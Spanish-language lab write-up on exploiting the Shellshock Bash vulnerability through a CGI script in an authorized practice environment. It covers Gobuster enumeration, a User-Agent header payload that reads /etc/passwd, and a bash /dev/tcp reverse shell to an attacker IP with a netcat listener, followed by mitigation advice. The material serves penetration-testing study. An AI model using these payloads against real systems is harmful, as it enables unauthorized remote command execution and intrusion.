
## 1. Vulnerabilidad Shellshock (CVE-2014-6271)

**Shellshock** es una vulnerabilidad de Bash que permite ejecutar comandos del sistema operativo mediante variables de entorno manipuladas.

Afecta a versiones vulnerables de GNU Bash, hasta la versión 4.3 según el material. Se puede explotar a través de aplicaciones CGI que pasan datos de las peticiones HTTP a variables de entorno.

Los scripts CGI suelen encontrarse en directorios como:

```
/cgi-bin/
```

Se ejecutan con los permisos del usuario que ejecuta el servidor web. Por ejemplo, si el servidor utiliza `www-data`, los comandos se ejecutarán con los permisos de ese usuario.

### Comprobar Shellshock localmente

El material utiliza este comando para comprobar si Bash es vulnerable:

```
env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"
```

**Resultado en un sistema no vulnerable:**

```
not vulnerable
```

En una versión vulnerable, también se ejecutaría el comando `echo vulnerable-shellshock`.

En los sistemas corregidos, Bash no ejecuta comandos adicionales colocados después de una definición de función importada desde una variable de entorno.

## 2. Enumeración de scripts CGI con Gobuster

El objetivo del laboratorio es:

```
10.129.204.231
```

Primero, buscamos scripts CGI dentro de `/cgi-bin/` utilizando Gobuster y la lista de palabras `small.txt`.

```
gobuster dir \
  -u http://10.129.204.231/cgi-bin/ \
  -w /usr/share/wordlists/dirb/small.txt \
  -x cgi
```

**Resultado encontrado:**

```
/access.cgi (Status: 200) [Size: 0]
```

El script descubierto es:

```
http://10.129.204.231/cgi-bin/access.cgi
```

### Comprobar el script con cURL

```
curl -i http://10.129.204.231/cgi-bin/access.cgi
```

Respuesta del servidor:

```
HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 0
Content-Type: text/html
```

El script devuelve una respuesta vacía. Sin embargo, esto no significa que sea seguro o que no pueda procesar peticiones internamente.

## 3. Comprobar la vulnerabilidad

Shellshock puede explotarse mediante cabeceras HTTP que terminan convirtiéndose en variables de entorno para un script CGI.

En el laboratorio se utiliza la cabecera `User-Agent`.

La prueba consiste en enviar una cabecera manipulada que intenta ejecutar un comando para leer `/etc/passwd`. Si la respuesta contiene el archivo, se confirma que el comando se ha ejecutado.

**Comando del laboratorio:**

```
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' \
  bash -s :'' \
  http://10.129.204.231/cgi-bin/access.cgi
```

### Resultado importante

La respuesta muestra usuarios del sistema, entre ellos:

```
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
kim:x:1000:1000:,,,:/home/kim:/bin/bash
```

Esto confirma que el comando se ha ejecutado a través del script CGI vulnerable.

**Dato importante:** el usuario `www-data` aparece en el archivo, pero eso no demuestra por sí solo que sea el usuario efectivo de ejecución. Para comprobarlo, debemos obtener la identidad del proceso o de la shell.

## 4. Obtener una shell inversa

Una vez confirmada la ejecución remota de comandos, el material muestra cómo obtener una shell inversa mediante Bash.

Se utiliza la dirección IP del equipo atacante `10.10.14.38` y el puerto `7777`.

### En el equipo atacante

Preparar un listener de Netcat:

```
sudo nc -lvnp 7777
```

### Enviar la petición al objetivo

El ejemplo del laboratorio utiliza una cabecera `User-Agent` que intenta abrir una conexión inversa:

```
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' \
  http://10.129.204.231/cgi-bin/access.cgi
```

Si la explotación funciona y existe conectividad entre ambos equipos, el listener recibirá una conexión.

### Resultado del laboratorio

```
listening on [any] 7777 ...
connect to 10.10.14.38 from (UNKNOWN) 10.129.204.231
```

La shell obtenida muestra:

```
www-data@htb:/usr/lib/cgi-bin$
```

Para comprobar los permisos:

```
id
```

Resultado:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Por tanto, el acceso inicial se obtiene como `**www-data**`, no como `root`.

Desde aquí, el siguiente paso sería investigar los permisos disponibles, buscar información sensible y comprobar posibles vías de escalada de privilegios.

## 5. Mitigación

El material recomienda:

- Actualizar Bash a una versión corregida.
    
- Si el sistema está obsoleto, solucionar primero los problemas que impidan actualizarlo.
    
- En dispositivos IoT que no puedan actualizarse, evitar su exposición directa a Internet.
    
- Aislar los sistemas afectados mediante reglas de firewall cuando sea necesario.
    
- Evaluar la retirada de los equipos que no puedan protegerse adecuadamente.
    

El aislamiento es una medida temporal: la solución preferible es actualizar el sistema o retirar el equipo vulnerable.

## 6. Checklist para el laboratorio

1. Buscar scripts CGI con Gobuster.
    
2. Identificar `access.cgi`.
    
3. Comprobar la respuesta del script con cURL.
    
4. Probar la vulnerabilidad Shellshock mediante la cabecera `User-Agent`.
    
5. Verificar la ejecución de comandos observando la respuesta.
    
6. Si se confirma la vulnerabilidad, obtener una shell en el entorno autorizado.
    
7. Ejecutar `id` para comprobar el usuario efectivo.
    
8. Investigar los permisos de `www-data` y posibles vías de escalada de privilegios.
